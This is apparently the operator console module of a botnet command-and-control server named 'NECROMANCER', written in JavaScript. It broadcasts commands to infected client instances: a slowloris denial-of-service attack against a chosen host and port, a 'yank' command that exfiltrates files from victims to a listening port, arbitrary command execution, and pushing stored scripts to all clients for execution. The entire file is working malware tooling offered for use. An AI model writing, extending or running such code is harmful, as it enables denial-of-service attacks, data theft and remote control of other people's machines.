import readline from "readline";
import fs from "fs";
import { clientModules, broadcast } from "./server.js";
import recieve from "./recieve.js";
import help from "./help.json" assert { type: "json" };

const rl = readline.createInterface({
	input: process.stdin,
	output: process.stdout,
});

export function prompt() {
	rl.question("\x1b[31m[NECROMANCER]\x1b[0m ", (message) => {
		message = message.toLowerCase();

		// Commands
		const commandArgs = {
			firstArg: message.split(" ")[1],
			secondArg: message.split(" ")[2],
			thirdArg: message.split(" ")[3],
			fourthArg: message.split(" ")[4],
		};

		if (message.startsWith("instances")) {
			if (message === "instances") {
				console.log(
					`Instances: ${clientModules.clientInstances.length}`
				);
			} else if (commandArgs.firstArg <= clientModules.clients.length) {
				clientModules.clientInstances = [...clientModules.clients];
				clientModules.clientInstances =
					clientModules.clientInstances.slice(
						0,
						commandArgs.firstArg
					);
			}
		}

		if (commandArgs.firstArg === "all")
			clientModules.clientInstances = [...clientModules.clients];

		if (message.startsWith("help")) {
			if (message === "help") {
				console.log("Commands:");
				for (let i = 0; i < help.length; i++) {
					console.log(help[i].command);
				}
			} else if (
				help.filter((i) => i.command === commandArgs.firstArg).length >
				0
			) {
				let commandIndex = help
					.map((i) => i.command)
					.indexOf(commandArgs.firstArg);

				console.log(
					`Functionality: ${help[commandIndex].functionality}\nUsage: ${help[commandIndex].usage}`
				);
			}
		}

		if (message.startsWith("silent")) {
			if (message === "silent")
				console.log(`silent: ${clientModules.silent}`);
			else if (commandArgs.firstArg === "true") {
				clientModules.silent = true;
			} else {
				clientModules.silent = false;
			}
		}

		if (message === "clear") console.clear();

		// Scripts and attacks
		if (message === "scripts") {
			listScripts();
		}

		if (message.startsWith("run")) {
			runScript(commandArgs.firstArg);
		}

		if (message.startsWith("slowloris")) {
			if (message === "slowloris") {
				console.log(
					"Please provide arguments: slowloris (host) (port) (duration ms) (sockets)"
				);
			} else if (commandArgs.firstArg !== undefined) {
				broadcast(message);
				console.log(`Attack sent!`);
			}

			let duration = commandArgs.thirdArg;

			if (commandArgs.thirdArg === undefined) {
				duration = 60000;
			}

			setTimeout(() => {
				console.log("Attack completed!");
			}, duration);
		}

		if (message.startsWith("yank")) {
			if (message === "yank")
				console.log(
					"Please provide arguments: yank (file name) (port)"
				);

			if (commandArgs.firstArg !== undefined) {
				recieve(commandArgs.firstArg, commandArgs.secondArg);
				broadcast(message);
			}
		}

		if (message.startsWith("exec")) broadcast(message);

		return prompt();
	});
}

const scriptsDir = "../config/scripts";

function listScripts() {
	fs.readdir(scriptsDir, (err, files) => {
		console.log("\nList of scripts in script dir:");
		files.forEach((file) => {
			if (file !== "convert.ps1") console.log(`\x1b[34m${file}\x1b[0m`);
		});
		prompt();
	});
}

function runScript(scriptName) {
	fs.readdir(scriptsDir, (err, files) => {
		files.forEach((file) => {
			if (file === scriptName) {
				fs.readFile(
					`${scriptsDir}/${scriptName}`,
					"utf8",
					(err, data) => {
						console.log("\x1b[91mRunning script...\x1b[0m");
						broadcast(`exec ${data}`);
					}
				);
			}
		});
		prompt();
	});
}
